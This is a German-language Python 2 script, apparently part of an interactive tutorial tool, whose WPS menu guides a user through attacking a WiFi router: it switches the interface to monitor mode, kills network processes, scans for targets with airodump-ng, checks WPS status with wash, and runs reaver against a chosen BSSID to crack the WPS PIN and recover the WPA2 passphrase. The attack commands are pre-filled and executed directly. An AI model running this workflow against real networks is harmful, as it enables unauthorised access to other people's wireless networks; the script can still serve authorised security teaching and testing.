#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import subprocess

import colors
import generics
from generics import rlinput,execute,clearScreen


def WPS_Menu():
	attack = True
	while(attack==True):
		clearScreen()
		shellCols = colors.ShellColors
		print shellCols.UNDERLINE + shellCols.HEADER + 'Untermenü: WPS-PIN Knacken' + shellCols.ENDC +'\n'
		print('Um dieses Tutorial durchzuführen müssen zuerst folgende Parameter vorgegeben werden: '
			+'\n 1. Name des WLAN-Interfaces '
			+'\n 2. Die BSSID und Kanalnummer des angegriffenen Routers/Netzwerks\n')
		
		#STEP 1
		command = rlinput('WLAN-Interfacename ermitteln mittels: \n# ', 'ifconfig')
		execute(command)
		wifi_name = raw_input("Name des WLAN-Interfaces hier angeben: ")

		#MONITOR MODE
		generics.monitor_mode(wifi_name)
		
		#KILL PROCESSES
		generics.kill_wifi_proc()

		#STEP 1 Check again
		wifi_name = generics.check_wifi_name(wifi_name)
		
		#STEP 2
		command = rlinput('Die BSSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren): \n# ', 'airodump-ng ' +wifi_name )
		execute(command)
		router_bssid = raw_input("Bitte die Router BSSID angeben: ")
		router_chn = raw_input("Bitte die Netzwerk Kanalnummer angeben: ")
		
		#STRIP STRINGS
		wifi_name = wifi_name.strip()
		router_bssid = router_bssid.strip()
		router_chn = router_chn.strip()

		#OVERVIEW CONFIGURATION
		print("\n")
		print shellCols.UNDERLINE + shellCols.HEADER + "Folgende Konfiguration für die Druchführung der Angriffe wurde festgehalten:" + shellCols.ENDC + '\n'
		print('WLAN-Interfacename: ' + wifi_name)
		print('BSSID: ' + router_bssid)
		print('Kanalnummer: ' + router_chn)
		print("\n")

		
		print('\n')
	
		#CHECK WPS LOCK
		print ('Nun beginnt der eigentliche Angriff:\n')
		command = rlinput('Zuerst muss geprüft werden, ob der ausgewählte Router WPS unterstützt(Prüfen auf WPS-Locked: No): \n# ', 'wash -i ' + wifi_name + ' -c ' +router_chn + ' -C -s')
		execute(command)

		#CRACK WPA2-PSK
		command = rlinput('Nun wird die WPS-PIN geknackt und der WPA2-PSK extrahiert: \n# ', 'reaver -i ' + wifi_name + ' -b ' +router_bssid )
		execute(command)

		#ReStart Networkmanager
                generics.restart_networkmanager()

		#END
		print('Ende des WPS-Tutorials erreicht! \n Bitte wählen zum Fortfahren: \n')
		print ('1. Zurück zum Menu \n'
			+ '2. Zurück zur WPS-Übersicht\n' 
			+ '0. Tutorial beenden \n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=0
		if(selection==1):
			attack = False
			return True
		elif(selection==2):
			attack=True
			#Just du magic stuff. Unicorn!!
		else: 
			attack = False
			return False



	#FINISHED WPS ATTACK
